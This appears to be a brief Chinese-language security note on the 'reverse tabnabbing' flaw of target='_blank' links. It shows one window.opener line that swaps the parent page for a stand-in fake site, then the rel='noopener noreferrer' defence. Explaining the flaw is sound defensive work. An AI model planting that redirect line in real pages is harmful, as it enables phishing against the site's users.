---
sidebarDepth: 2
---

# target="_ blank"背后的隐藏漏洞


> <a href="https://cloud.tencent.com/developer/news/681370" target="_blank" rel="noopener noreferrer nofollow">源链接地址</a>



> 原理

target打开一个新页签之后，在这个新页面中，可以通过window.opener对象操纵父页面。例如：
	window.opener.location.replace('https://a.fake.site/?' + url);可以直接将父页面的地址切换掉。
	
> 防御

```
<a href="https://an.evil.site" target="_blank" rel="noopener noreferrer nofollow">Enter an "evil" website</a>
```


